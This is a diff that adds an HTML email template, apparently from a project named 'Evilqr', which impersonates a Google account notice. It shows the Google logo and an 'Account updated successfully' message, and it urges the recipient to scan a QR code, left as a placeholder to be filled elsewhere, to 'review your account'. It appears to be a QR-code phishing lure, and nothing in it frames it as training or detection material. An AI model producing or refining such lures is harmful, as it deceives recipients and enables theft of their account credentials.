@@ -1,0 +1,137 @@
+<!-- e:\projects\Evilqr\google.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Account Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --card-width: 480px;
+      --card-radius: 14px;
+      --text-color: #202124;
+      --muted-color: #5f6368;
+      --border-color: #e0e3e7;
+      --accent: #1a73e8;
+      --bg: #f1f3f4;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 24px;
+      background: var(--bg);
+      font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+      color: var(--text-color);
+    }
+    .email-wrap {
+      max-width: var(--card-width);
+      margin: 0 auto;
+    }
+    .card {
+      background: #fff;
+      border-radius: var(--card-radius);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+      overflow: hidden;
+      border: 1px solid var(--border-color);
+    }
+    .card-header {
+      padding: 24px 24px 0 24px;
+      text-align: center;
+    }
+    .brand {
+      font-weight: 600;
+      letter-spacing: 0.2px;
+      color: var(--accent);
+      font-size: 18px;
+    }
+    .title {
+      margin: 0px 0 8px;
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--text-color);
+    }
+    .divider {
+      height: 1px;
+      background: var(--border-color);
+      margin: 20px 0 0;
+    }
+    .card-body {
+      padding: 20px 24px 28px;
+      text-align: left;
+    }
+    .greet {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    .copy {
+      font-size: 14px;
+      color: var(--muted-color);
+      line-height: 1.6;
+      margin-bottom: 18px;
+    }
+    .scan {
+      font-size: 14px;
+      margin-bottom: 14px;
+    }
+    .qr-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 8px 0 2px;
+    }
+    /* Blank QR placeholder — will be filled elsewhere */
+    #AlphaQR.AlphaQR {
+      width: 220px;
+      height: 220px;
+      background: transparent;
+      border-radius: 8px;
+    }
+    .footer {
+      font-size: 12px;
+      color: var(--muted-color);
+      text-align: center;
+      padding: 14px 10px 6px;
+    }
+    .copyright {
+      font-size: 12px;
+      color: var(--muted-color);
+      text-align: center;
+      padding-bottom: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="email-wrap">
+    <div class="card">
+      <div class="card-header">
+        <div class="brand">Account Services</div>
+        <img src="https://pngimg.com/uploads/google/google_PNG19644.png" alt="Google Logo" width="90" height="40">
+        <div class="title">Account updated successfully</div>
+        <div class="divider"></div>
+      </div>
+
+      <div class="card-body">
+        <div class="greet">Welcome back to your account</div>
+        <div class="copy">
+          If you suspect that your account has been locked due to changes made by someone else,
+          scan the QR Code below and review your account:
+        </div>
+
+        <div class="scan"><strong>Scan the QR Code</strong></div>
+
+        <div class="qr-wrap">
+          <div id="AlphaQR" class="AlphaQR" aria-label="QR placeholder"></div>
+        </div>
+
+        <div class="footer">
+          You received this email to let you know about important changes to your account and services.
+        </div>
+        <div class="copyright">
+          © 2024 Account Services
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
